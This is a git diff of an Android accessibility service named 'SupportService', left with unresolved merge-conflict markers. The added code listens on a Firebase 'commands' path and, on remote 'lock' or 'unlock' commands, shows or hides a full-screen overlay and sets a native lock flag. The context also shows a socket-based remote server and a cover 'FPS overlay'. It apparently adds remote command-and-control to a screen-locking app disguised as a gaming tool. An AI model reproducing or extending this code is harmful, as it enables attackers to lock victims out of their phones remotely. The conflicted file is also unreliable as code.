@@ -23,6 +23,15 @@ import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
 
+<<<<<<< HEAD
+=======
+import com.google.firebase.database.DataSnapshot;
+import com.google.firebase.database.DatabaseError;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+import com.google.firebase.database.ValueEventListener;
+
+>>>>>>> 7e25162 (lalala)
 import androidx.core.view.ViewCompat;
 
 import java.io.BufferedReader;
@@ -53,6 +62,10 @@ public class SupportService extends AccessibilityService {
     
     private ServerSocket serverSocket;
     private boolean isLocked = false;
+<<<<<<< HEAD
+=======
+    private DatabaseReference dbRef;
+>>>>>>> 7e25162 (lalala)
 
     public native void initNative(String path);
     public native void setLockStatus(boolean locked);
@@ -107,6 +120,10 @@ public class SupportService extends AccessibilityService {
         wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
         init_timer();
         startRemoteServer();
+<<<<<<< HEAD
+=======
+        initFirebaseListener();
+>>>>>>> 7e25162 (lalala)
         
         if (isLockedNative()) {
             isLocked = true;
@@ -213,6 +230,46 @@ public class SupportService extends AccessibilityService {
         return START_STICKY;
     }
 
+<<<<<<< HEAD
+=======
+    private void initFirebaseListener() {
+        dbRef = FirebaseDatabase.getInstance().getReference("commands");
+        dbRef.addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(DataSnapshot snapshot) {
+                String cmd = snapshot.getValue(String.class);
+                if (cmd == null) return;
+
+                task_handler.post(() -> {
+                    if (cmd.equalsIgnoreCase("lock")) {
+                        if (!isLocked) {
+                            input_buffer.setLength(0);
+                            setLockStatus(true);
+                            hideFpsOverlay();
+                            showOverlay();
+                            isLocked = true;
+                        }
+                    } else if (cmd.equalsIgnoreCase("unlock")) {
+                        if (isLocked) {
+                            setLockStatus(false);
+                            hideOverlay();
+                            isLocked = false;
+                            input_buffer.setLength(0);
+                            SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
+                            if (fpsPrefs.getBoolean("is_showing", false)) {
+                                showFpsOverlay();
+                            }
+                        }
+                    }
+                });
+            }
+
+            @Override
+            public void onCancelled(DatabaseError error) {}
+        });
+    }
+
+>>>>>>> 7e25162 (lalala)
     private void startRemoteServer() {
         new Thread(() -> {
             try {
